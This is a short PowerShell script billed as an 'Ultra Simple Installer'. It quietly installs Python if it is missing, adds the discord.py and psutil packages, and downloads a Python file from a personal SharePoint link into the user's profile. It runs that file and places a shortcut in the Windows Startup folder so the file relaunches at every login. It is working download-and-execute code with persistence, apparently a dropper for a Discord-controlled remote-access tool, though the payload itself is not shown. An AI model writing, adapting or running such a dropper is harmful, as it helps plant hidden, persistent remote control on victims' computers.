# Ultra Simple Installer
Write-Host "Setup starting..."

# Check Python
try {
    python --version
    $hasPython = $true
} catch {
    $hasPython = $false
}

if (-not $hasPython) {
    Write-Host "Installing Python..."
    (New-Object System.Net.WebClient).DownloadFile("https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe", "C:\Windows\Temp\p.exe")
    Start-Process "C:\Windows\Temp\p.exe" -ArgumentList "/quiet PrependPath=1 Include_pip=1" -Wait
    Start-Sleep -Seconds 10
}

Write-Host "Installing packages..."
python -m pip install discord.py psutil --user

Write-Host "Downloading app..."
(New-Object System.Net.WebClient).DownloadFile("https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=UT9Chy&download=1", "$env:USERPROFILE\app.py")

Write-Host "Starting app..."
Start-Process python -ArgumentList "$env:USERPROFILE\app.py"

Write-Host "Adding to startup..."
$s = [Environment]::GetFolderPath("Startup")
$w = New-Object -ComObject WScript.Shell
$l = $w.CreateShortcut("$s\app.lnk")
$l.TargetPath = "python"
$l.Arguments = "$env:USERPROFILE\app.py"
$l.Save()

Write-Host "Done! Closing..."
Start-Sleep -Seconds 2

